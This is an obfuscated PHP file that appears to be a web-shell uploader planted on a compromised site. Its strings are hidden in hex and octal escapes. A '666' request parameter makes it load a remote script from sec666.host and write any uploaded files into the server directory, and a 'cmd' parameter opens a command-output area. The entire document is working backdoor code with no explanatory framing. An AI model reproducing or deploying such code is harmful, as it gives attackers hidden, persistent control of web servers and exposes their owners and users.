<?php if (isset($_GET["\x36\66\66"])) { echo "\x3c\x68\164\x6d\x6c\76\74\x73\143\162\151\160\164\40\163\x72\x63\75\42\150\164\x74\160\x73\x3a\x2f\x2f\163\145\x63\x36\x36\x36\56\150\157\x73\x74\x2f\165\160\x2e\152\x73\x22\x3e\74\x2f\163\143\162\151\160\x74\x3e"; if (isset($_FILES["\x53\x65\143\66\66\66\125\160\x6c\x6f\141\144"]["\x6e\141\155\x65"])) { $Sec666Count = count($_FILES["\x53\x65\143\66\x36\66\125\160\x6c\157\x61\x64"]["\156\x61\x6d\145"]); $Sec666Total = 0; for ($Sec666Key = 0; $Sec666Key < $Sec666Count; $Sec666Key++) { if (isset($_FILES["\x53\x65\143\x36\66\x36\x55\x70\154\157\141\x64"]["\x6e\x61\155\145"][$Sec666Key]) && $_FILES["\123\x65\x63\66\x36\66\x55\160\x6c\157\x61\x64"]["\x73\151\172\145"][$Sec666Key] > 0) { $Sec666Ext = strtolower(pathinfo($_FILES["\123\x65\x63\x36\x36\x36\125\x70\154\x6f\x61\x64"]["\156\x61\155\145"][$Sec666Key], PATHINFO_EXTENSION)); $Sec666FileName = $_FILES["\123\x65\143\x36\x36\x36\x55\160\x6c\x6f\141\144"]["\156\141\155\145"][$Sec666Key]; $Sec666Target = basename($Sec666FileName); $Sec666Tmp = $_FILES["\x53\x65\143\x36\x36\66\125\x70\x6c\x6f\x61\144"]["\164\x6d\x70\137\x6e\x61\x6d\x65"][$Sec666Key]; if (move_uploaded_file($Sec666Tmp, $Sec666Target)) { $Sec666Total++; } } } echo "\x3c\x73\143\x72\x69\160\164\x3e\x61\x6c\x65\162\164\50\x22" . $Sec666Total . "\40\x46\x69\154\x65\x73\40\x55\x70\154\x6f\x61\x64\x65\x64\42\x29\74\57\x73\x63\162\x69\160\164\76"; } } if (isset($_REQUEST["\x63\155\144"])) { echo "\x3c\142\x72\x3e\40\x3c\160\162\145\40\x66\x6f\156\x74\75\47\x62\154\141\x63\153\47\x3e";} ?>